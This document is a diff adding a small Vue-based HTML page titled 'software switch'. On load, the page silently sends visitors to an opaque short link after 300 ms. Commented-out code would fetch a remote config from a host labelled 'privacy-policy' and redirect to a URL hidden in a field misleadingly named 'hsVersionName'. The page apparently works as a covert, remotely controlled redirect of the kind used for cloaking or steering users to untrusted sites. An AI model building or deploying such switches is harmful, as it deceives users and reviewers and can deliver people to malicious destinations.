@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>软件开关</title>
+    <!-- 引入Vue库 -->
+    <script src="https://unpkg.com/vue@3/dist/vue.global.js"></script>
+</head>
+<body>
+    <div id="app">
+        <!-- 显示加载状态 -->
+        <div v-if="loading">加载中...</div>
+        
+        <!-- 显示错误信息 -->
+        <div v-if="error" style="color: red;">{{ error }}</div>
+        
+        <!-- 数据加载成功后跳转或显示内容 -->
+        <div v-if="dataLoaded">
+            数据加载完成，即将跳转...
+        </div>
+    </div>
+
+    <script>
+        // 创建Vue实例
+        const { createApp } = Vue;
+
+        createApp({
+            data() {
+                return {
+                    loading: false,
+                    error: '',
+                    dataLoaded: false,
+                    targetUrl: '' // 用于存储从接口获取的目标链接
+                }
+            },
+            methods: {
+                // 发起GET请求
+       //          async fetchData() {
+       //              this.loading = true;
+       //              this.error = '';
+                    
+       //              try {
+       //                  // 替换为你的API地址
+       //                  const apiUrl = 'https://privacy-policy-8gsuvw0l21f6aaaf-1254326232.ap-shanghai.app.tcloudbase.com/https://gitee.com/mark202504/project21/raw/master/project';
+                        
+       //                  // 发起GET请求
+       //                  const response = await fetch(apiUrl, {
+       //                      method: 'GET',
+							// headers: {
+							//     'Accept': 'application/json',
+							//     'X-Requested-With': 'XMLHttpRequest'
+							// }
+       //                  });
+                        
+       //                  if (!response.ok) {
+       //                      throw new Error(`请求失败: ${response.status}`);
+       //                  }
+                        
+       //                  // 解析响应数据
+       //                  const result = await response.json();
+       //                  console.log('resulu',JSON.stringify(result))
+       //                  // 假设接口返回格式为 { url: "https://目标链接" }
+       //                  if (result.hsVersionName) {
+       //                      this.targetUrl = result.hsVersionName;
+       //                      this.dataLoaded = true;
+       //                      // 延迟1秒后跳转（可根据需要调整或移除延迟）
+       //                      setTimeout(() => {
+       //                          window.location.href = this.targetUrl;
+       //                      }, 1000);
+       //                  } else {
+       //                      throw new Error('未获取到有效链接');
+       //                  }
+                        
+       //              } catch (err) {
+       //                  this.error = err.message;
+       //              } finally {
+       //                  this.loading = false;
+       //              }
+       //          }
+            },
+            mounted() {
+                // 页面加载完成后自动发起请求
+               // this.fetchData();
+			   // 延迟1秒后跳转（可根据需要调整或移除延迟）
+			   setTimeout(() => {
+			       window.location.href = 'http://9r89i.com/bAVcDjw';
+			   }, 300);
+            }
+        }).mount('#app');
+    </script>
+</body>
+</html>
+    
